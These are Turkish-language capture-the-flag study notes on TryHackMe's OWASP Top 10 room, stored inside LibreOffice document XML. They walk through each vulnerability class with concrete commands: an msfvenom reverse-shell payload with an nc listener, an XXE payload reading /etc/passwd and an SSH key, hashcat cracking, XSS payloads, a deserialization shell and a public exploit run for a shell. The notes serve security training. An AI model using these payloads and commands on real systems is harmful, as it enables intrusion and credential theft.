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2248e9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2816e0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1c490a" officeooo:paragraph-rsid="0034d51d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2ab030" officeooo:paragraph-rsid="002ab030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2c5c22" officeooo:paragraph-rsid="002c5c22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2d072d" officeooo:paragraph-rsid="002d072d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2d587a" officeooo:paragraph-rsid="002d587a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308ba3" officeooo:paragraph-rsid="00308ba3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326127" officeooo:paragraph-rsid="00326127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335c1a" officeooo:paragraph-rsid="00335c1a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.5pt" fo:font-weight="normal" officeooo:rsid="0034ac73" officeooo:paragraph-rsid="0034ac73" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="0036e812" officeooo:paragraph-rsid="0036e812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fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="0037b674" officeooo:paragraph-rsid="0037b674" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="0039ac27" officeooo:paragraph-rsid="0039ac27" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P15" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="003b607c" officeooo:paragraph-rsid="003b607c" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P16" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="003c8b8d" officeooo:paragraph-rsid="003c8b8d" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P17" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="003e40ea" officeooo:paragraph-rsid="003e40ea" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P18" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="003f10b6" officeooo:paragraph-rsid="003f10b6" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P19" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="0040d98d" officeooo:paragraph-rsid="0040d98d" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P20" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="00419b97" officeooo:paragraph-rsid="00419b97" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P21" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="00438923" officeooo:paragraph-rsid="00438923" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P22" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="0044b324" officeooo:paragraph-rsid="0044b324" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P23" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#c9211e" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="002ce4f0" officeooo:paragraph-rsid="002ce4f0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color="#c9211e" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="002d072d" officeooo:paragraph-rsid="002d072d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fo:color="#c9211e" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="0034ac73" officeooo:paragraph-rsid="0034ac73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color="#c9211e" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="0036ab17" officeooo:paragraph-rsid="0036ab17" style:font-size-asian="14pt" style:font-weight-asian="bold" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P27" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#c9211e" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="0036ab17" officeooo:paragraph-rsid="0037b674" style:font-size-asian="14pt" style:font-weight-asian="bold" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P28" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#c9211e" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="003c8b8d" officeooo:paragraph-rsid="003c8b8d" style:font-size-asian="14pt" style:font-weight-asian="bold" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P29" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#c9211e" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="003f10b6" officeooo:paragraph-rsid="003f10b6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fo:color="#c9211e" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="0045d793" officeooo:paragraph-rsid="0045d793" style:font-size-asian="14pt" style:font-weight-asian="bold" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P31" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#c9211e" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="15pt" fo:font-weight="bold" officeooo:rsid="0028e966" officeooo:paragraph-rsid="0028e966" style:font-size-asian="15pt" style:font-weight-asian="bold" style:font-size-complex="15pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P32" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="0047cb02" officeooo:paragraph-rsid="0047cb02" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P33" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="00480b14" officeooo:paragraph-rsid="00480b14" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P34" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="0049cd07" officeooo:paragraph-rsid="0049cd07" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P35" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="004ba2e5" officeooo:paragraph-rsid="004ba2e5" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P36" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="001c490a" officeooo:paragraph-rsid="002816e0" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P37" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="004df1fa" officeooo:paragraph-rsid="004df1fa" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P38" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="004f543c" officeooo:paragraph-rsid="004f543c" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P39" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="0050be91" officeooo:paragraph-rsid="0050be91" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P40" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="005295be" officeooo:paragraph-rsid="005295be" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P41" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="0054611b" officeooo:paragraph-rsid="0054611b" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P42" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="00547326" officeooo:paragraph-rsid="00547326" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P43" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties officeooo:paragraph-rsid="004ba2e5"/>
    </style:style>
    <style:style style:name="P44" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#c9211e" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="0045d793" officeooo:paragraph-rsid="0052760b" style:font-size-asian="14pt" style:font-weight-asian="bold" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties officeooo:rsid="002c5c22"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties officeooo:rsid="002d072d"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties officeooo:rsid="00335c1a"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties officeooo:rsid="0034d51d"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties officeooo:rsid="0037b674"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties officeooo:rsid="0039ac27"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties officeooo:rsid="003b607c"/>
    </style:style>
    <style:style style:name="T8" style:family="text">
      <style:text-properties officeooo:rsid="003c8b8d"/>
    </style:style>
    <style:style style:name="T9" style:family="text">
      <style:text-properties officeooo:rsid="00419b97"/>
    </style:style>
    <style:style style:name="T10" style:family="text">
      <style:text-properties officeooo:rsid="0044b324"/>
    </style:style>
    <style:style style:name="T11" style:family="text">
      <style:text-properties officeooo:rsid="0045d793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045d793" style:font-size-asian="15pt" style:font-size-complex="15pt"/>
    </style:style>
    <style:style style:name="T14" style:family="text">
      <style:text-properties fo:font-size="15pt" officeooo:rsid="0052760b" style:font-size-asian="15pt" style:font-size-complex="15pt"/>
    </style:style>
    <style:style style:name="T15" style:family="text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="004ba2e5" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T16" style:family="text">
      <style:text-properties officeooo:rsid="004c444b"/>
    </style:style>
    <style:style style:name="T17" style:family="text">
      <style:text-properties officeooo:rsid="005276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Online Lab – Alıştırma &amp; Pratik (CTF ile)</text:p>
      <text:p text:style-name="P31">Capture the Flag</text:p>
      <text:p text:style-name="P1">https://tryhackme.com/room/owasptop10</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P30"><text:span text:style-name="T12">A1</text:span>-Command Injection</text:p>
      <text:p text:style-name="P4">openvpn (config file)</text:p>
      <text:p text:style-name="P4">compgen -u <text:s/>(userları dizdirdik)</text:p>
      <text:p text:style-name="P4">getent passwd | cut -d: -f1 <text:s/>(okuduğumuz dosyanın ilk hanelerini yani userları okur.)</text:p>
      <text:p text:style-name="P1">cat /etc/passwd | grep "www-data" <text:span text:style-name="T1">(sonuncusu, shelldir)</text:span></text:p>
      <text:p text:style-name="P1">cat /etc/os-release</text:p>
      <text:p text:style-name="P5">MOTD, Bağlanıldığı zamanki karşılama mesajıdır.</text:p>
      <text:p text:style-name="P1">ls /etc | grep "motd" <text:s/><text:span text:style-name="T1">(ile nerede olduğunu bulduk.) .d ile bitmesi directory demek.</text:span></text:p>
      <text:p text:style-name="P1">cat /etc/update-motd.d/00-header <text:s/><text:span text:style-name="T1">(bulduk.)</text:span></text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.80 -f exe -o ~/Desktop/hacker31.exe</text:p>
      <text:p text:style-name="P1">python -m http.server</text:p>
      <text:p text:style-name="P1">ln -s http://10.10.10.80:8000/Desktop/hacker31.exe</text:p>
      <text:p text:style-name="P5">Dosyamız karşıda.</text:p>
      <text:p text:style-name="P5">msfvenom --payload linux/x86/shell_reverse_tcp --list-options <text:s text:c="61"/></text:p>
      <text:p text:style-name="P5">ayarlarından, hangi portu kullandığına bakacağız.</text:p>
      <text:p text:style-name="P5">Lport=4444 bulduk.</text:p>
      <text:p text:style-name="P5">nc -lvp 4444</text:p>
      <text:p text:style-name="P5">karşıda exeyi çalıştırdığımızda, içerdeyiz.</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P23"><text:span text:style-name="T13">A2</text:span><text:span text:style-name="T11">-</text:span>Broken Authentication</text:p>
      <text:p text:style-name="P6">Register olurken, kullanıcı adının başına ( ) space koyarak güvenlik açığı yaratırız. Böylece asıl aynı isimli heaba giriş yapabilmiş oluruz.</text:p>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P24"><text:span text:style-name="T13">A3</text:span><text:span text:style-name="T11">-</text:span>Sensitive Data Exposure</text:p>
      <text:p text:style-name="P6">Amacımız, SQL(NoSQL) ve flat-file db lerini okumak.</text:p>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P6">dizin keşfi için dirbuster kullanacağız.</text:p>
      <text:p text:style-name="P2">http://10.10.157.66</text:p>
      <text:p text:style-name="P2">/usr/share/wordlists/dirbuster/directory-list-1.0.txt <text:span text:style-name="T2">(wordlist belirledik.)</text:span></text:p>
      <text:p text:style-name="P6">file extension *</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P7">login sayfasına gelip, sourcecode a bakalım.</text:p>
      <text:p text:style-name="P2">Must remember to do something better with the database than store it in /assets</text:p>
      <text:p text:style-name="P2"><text:a xlink:type="simple" xlink:href="http://10.10.157.66/assets/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">http://10.10.157.66/assets/</text:a></text:p>
      <text:p text:style-name="P8">dizine girdik.</text:p>
      <text:p text:style-name="P8">Db indirdik, şimdi kendi sistemimizde inceleyeceğiz.</text:p>
      <text:p text:style-name="P9">File /root/Desktop/webapp.db <text:s/>(swlite kullandığını bulduk.)</text:p>
      <text:p text:style-name="P9">sqlite3 /root/Desktop/webapp.db</text:p>
      <text:p text:style-name="P9">.<text:span text:style-name="T3">tables</text:span></text:p>
      <text:p text:style-name="P10">pragma table_info(users);</text:p>
      <text:p text:style-name="P10">SELECT * FROM users;</text:p>
      <text:p text:style-name="P2">hashcat -a 0 -m 0 <text:s/>6eea9b7ef19179a06954edd0f6c05ceb /usr/share/wordlists/rockyou.txt --status</text:p>
      <text:p text:style-name="P11"><text:soft-page-break/>login olup flag ı aldık..</text:p>
      <text:p text:style-name="P25"><text:span text:style-name="T13">A4</text:span><text:span text:style-name="T11">-</text:span>XML External Entity</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="Source_20_Text">&lt;?xml version="1.0"?&gt;<text:line-break/>&lt;!DOCTYPE root [&lt;!ENTITY read SYSTEM 'file:///etc/passwd'&gt;]&gt;<text:line-break/>&lt;root&gt;&amp;read;&lt;/root&gt;</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">kullanıcı bilgilerini aldık.</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text">/</text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">home/falcon/.ssh/id_rsa </text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">ssh hashini aldık. Şimdi de notepad e yazdırıp console da ilk 18 haneyi alalım.</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text">head -c 18 /root/Desktop/ssh</text:span></text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P26"><text:span text:style-name="T13">A5</text:span><text:span text:style-name="T11">-</text:span>Broken Access Control (IDOR uygulama)</text:p>
      <text:p text:style-name="P12">Login sayfasına girdiğimizde, URL de note= diyerek uid veriyoruz.</text:p>
      <text:p text:style-name="P12">Burpsuite ile flag I bulacağız</text:p>
      <text:p text:style-name="P12">intruderdan, note a saldıracağız. (numbers, from 1 to 100, step 1)</text:p>
      <text:p text:style-name="P13">0 ı deneyelim ??</text:p>
      <text:p text:style-name="P13">flagımızı aldık.</text:p>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P27"><text:span text:style-name="T13">A6</text:span><text:span text:style-name="T11">-</text:span><text:span text:style-name="T5">Security Misconfiguration</text:span></text:p>
      <text:p text:style-name="P14">Login sayfasına girdik, önce <text:span text:style-name="T7">pensive/PensiveNotes</text:span> denedik</text:p>
      <text:p text:style-name="P2">pensive notes credentials <text:span text:style-name="T6">aratıp github gittik.</text:span></text:p>
      <text:p text:style-name="P15">Içerdeyiz.</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P28"><text:span text:style-name="T13">A7</text:span><text:span text:style-name="T11">-</text:span>Cross-Site Scripting (XSS)</text:p>
      <text:p text:style-name="P16">Stored-XSS : JS, CSS (manipulating site database)</text:p>
      <text:p text:style-name="P16">Reflected-XSS : Payload ve URL tıklatma</text:p>
      <text:p text:style-name="P16">DOM-Based-XSS : HTMK ve XML db</text:p>
      <text:p text:style-name="P16"/>
      <text:p text:style-name="P17">XSS reflected a, <text:span text:style-name="T8">&lt;script&gt;alert("Hello")&lt;/script&gt;</text:span></text:p>
      <text:p text:style-name="P17">&lt;script&gt;alert(window.location.hostname)&lt;/script&gt;</text:p>
      <text:p text:style-name="P16"/>
      <text:p text:style-name="P17">şimdi ise Stored XSS: register olup, yorum kısmına</text:p>
      <text:p text:style-name="P17">&lt;h1&gt;Hacked&lt;/h1&gt; <text:s/>yazdık ve html injection a açık olduğunu bulduk.</text:p>
      <text:p text:style-name="P17">&lt;script&gt;alert(document.cookies)&lt;/script&gt;</text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17">sourcecode a bakalım</text:p>
      <text:p text:style-name="P18">15.satırdaki XSS Ply. Yazısını değişmeye çalışıyoruz.</text:p>
      <text:p text:style-name="P18">&lt;script&gt;document.querySelector("#thm-title").textContent="I am a hacker"&lt;/script&gt;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><text:soft-page-break/></text:p>
      <text:p text:style-name="P29"><text:span text:style-name="T13">A8</text:span><text:span text:style-name="T11">-</text:span>Insecure Deserialization</text:p>
      <text:p text:style-name="P19">Serialization (Objeyi, 2lik binary sistem altında, databaselerde tutar.)</text:p>
      <text:p text:style-name="P19">Data, dönüştürüldüğünde çalıştırılabilir bir nesne oluyorsa, zararlı kodlar da çalıştırılabilir.</text:p>
      <text:p text:style-name="P19"/>
      <text:p text:style-name="P20">Rastgele bi kullanıcı oluşturup inspectten flagı aldık</text:p>
      <text:p text:style-name="P20">decode ediyoruz</text:p>
      <text:p text:style-name="P2">echo "gAN9cQAoWAkAAABzZXNzaW9uSWRxAVggAAAAOTdjZWJjYzhmNjY4NGQ0MTg1NWU3YzYwMjNlZjFhMDlxAlgLAAAAZW5jb2RlZGZsYWdxA1gYAAAAVEhNe2dvb2Rfb2xkX2Jhc2U2NF9odWh9cQR1Lg==" | base64 -<text:span text:style-name="T9">d</text:span></text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P20">tekrar, inspectten logini ve pass I admin olarak değiştirip f5 le flagı alıyoruz.</text:p>
      <text:p text:style-name="P20"/>
      <text:p text:style-name="P21">SHELL ALMA::</text:p>
      <text:p text:style-name="P21">Baştan giriş yaptık, exchange vim, provide feedback, inspectten, encoded payload u manupile edicez.</text:p>
      <text:p text:style-name="P21">.<text:span text:style-name="T10">py dosyasını indirip tub0 daki ipmizi koyuyoruz.</text:span></text:p>
      <text:p text:style-name="P22">Base64 ile encode edilmiş kodu aldık ve netcat ten dinlemedeyiz.</text:p>
      <text:p text:style-name="P22">Shell aldık.</text:p>
      <text:p text:style-name="P22">find ~/ -name "flag.txt" <text:s/><text:span text:style-name="T11">yerini bulduk.</text:span></text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P30"><text:span text:style-name="T12">A9</text:span>-Using Components with Known Vulnerabilities</text:p>
      <text:p text:style-name="P32">Yazılım kendisi olmasa bile, harici olarak kullanılan kütüphane veya frameworklerin güvensiz oluşu nedeniyle oluşan güvenlik açığı.</text:p>
      <text:p text:style-name="P33">Amacımız, kullanılan sitenin versiyon bilgisini alıp ona uygun olan exploiti çıkarmak.</text:p>
      <text:p text:style-name="P33">Admin logine girdik.</text:p>
      <text:p text:style-name="P34">11.nin bizimle alakalı labileceğini bulduk.</text:p>
      <text:p text:style-name="P34">Alternatif olarak Termianlde yapabiliriz.</text:p>
      <text:p text:style-name="P34">dirb http://10.10.57.35</text:p>
      <text:p text:style-name="P34"><text:a xlink:type="simple" xlink:href="http://10.10.57.35/database/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">http://10.10.57.35/database/</text:a> <text:s/>(bu dizinde tehlikeli dosyalar olabileceğini bulduk.)</text:p>
      <text:p text:style-name="P35">Version bilgisi bulmaya çalışıyoruz.</text:p>
      <text:p text:style-name="P43"><text:span text:style-name="T15">Contact bulduk </text:span>nghi.lethanh2@cou.fi</text:p>
      <text:p text:style-name="P35">github sayfasını bulduk</text:p>
      <text:p text:style-name="P35">güncelleme almadıysa, 1.0 olarak geçmesi muhtemel.</text:p>
      <text:p text:style-name="P35">searchsploit php bookstore <text:s text:c="2"/><text:span text:style-name="T16">(-w ve --id ile bilgi alınır)</text:span></text:p>
      <text:p text:style-name="P2">searchsploit online book --id <text:s text:c="4"/><text:span text:style-name="T16">(47887)</text:span></text:p>
      <text:p text:style-name="P2">searchsploit online book --id 47887 -m <text:s text:c="2"/><text:span text:style-name="T16">(exploiti aldık.)</text:span></text:p>
      <text:p text:style-name="P2">python3 /root/Desktop/47887.py http://10.10.57.35 </text:p>
      <text:p text:style-name="P37">shell aldık..</text:p>
      <text:p text:style-name="P37">wc -c /etc/passwd <text:s/>(hane sayısını bulduk. Flag tamam.)</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P38">sql dosyasını celeyelim.</text:p>
      <text:p text:style-name="P39">Hashi aldık, şimdi ise crack station dan crack edeceğiz.</text:p>
      <text:p text:style-name="P39">admin/admin olduğunu bulduk.</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P44"><text:soft-page-break/><text:span text:style-name="T12">A</text:span><text:span text:style-name="T14">10-</text:span><text:span text:style-name="T17">Insufficent Loging and Monitoring</text:span></text:p>
      <text:p text:style-name="P40">Indirdiğimiz log dosyalarına bakalım.</text:p>
      <text:p text:style-name="P41">Arka arkaya yapılan yanlış kullanıcı denemeleri, engellenmelidir.</text:p>
      <text:p text:style-name="P42">Log dosyasından, saldırganın ipsini ve saldırı türünü anlamaya çalışacağız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1T11:01:55.798135420</dc:date>
    <meta:editing-duration>PT8H32S</meta:editing-duration>
    <meta:editing-cycles>49</meta:editing-cycles>
    <meta:generator>LibreOffice/7.4.1.2$Linux_X86_64 LibreOffice_project/3c58a8f3a960df8bc8fd77b461821e42c061c5f0</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="5" meta:paragraph-count="107" meta:word-count="577" meta:character-count="5008" meta:non-whitespace-character-count="4461"/>
  </office:meta>
</office:document-meta>
</file>